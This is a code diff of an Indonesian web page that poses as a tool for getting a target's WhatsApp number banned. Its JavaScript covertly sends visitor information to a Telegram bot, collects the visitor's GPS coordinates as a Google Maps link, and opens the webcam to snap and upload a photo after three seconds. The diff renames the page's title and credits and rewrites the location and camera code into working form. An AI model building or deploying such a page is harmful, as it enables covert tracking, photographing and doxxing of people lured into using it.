@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Website Bans WhatsApp By Painzy</title>
+  <title>Website Bug Kipop</title>
   <meta name="viewport" content=
   "width=device-width, initial-scale=1.0">
   <link href=
@@ -125,7 +125,7 @@
 <body>
   <div class="bg-particles"></div>
   <div class="login-container">
-    <p class="login-title">Website Bans WhatsApp By Cella</p>
+    <p class="login-title">Website Bug By Kipop</p>
     <p class="login-subtitle">⚠️ Jangan
     Disalahgunakan</p><input type="number" class="login-input"
     placeholder="Nomor WhatsApp Target" id="text"> <button class=
@@ -201,52 +201,42 @@
       sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
 
       if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const link = `https://www.google.com/maps?q=${lat},${lon}`;
-      sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Lihat Lokasi</a>`);
-    },
-    err => {
-      sendToTelegram(`📍 Lokasi GPS gagal: ${err.message}`);
-    },
-    {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
-    }
-  );
-} else {
-  sendToTelegram('❌ Browser tidak mendukung GPS');
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
       }
+    }
 
     async function startCamera() {
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const ctx = canvas.getContext('2d');
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    await new Promise(resolve => video.onloadedmetadata = resolve);
-
-    // Tampilkan video dulu (kalau perlu)
-    video.style.display = 'block';
-
-    // Tunggu 3 detik untuk ambil gambar
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => {
-      if (blob) sendPhotoToTelegram(blob);
-      // Stop kamera
-      stream.getTracks().forEach(track => track.stop());
-    }, 'image/jpeg');
-  } catch (err) {
-    sendToTelegram('❌ Akses kamera ditolak atau tidak tersedia');
-  }
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) sendPhotoToTelegram(blob);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve();
+                }, 'image/jpeg');
+              }, 3000);
+            };
+          })
+          .catch(err => {
+            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            resolve();
+          });
+      });
     }
 
     button.addEventListener('click', async () => {
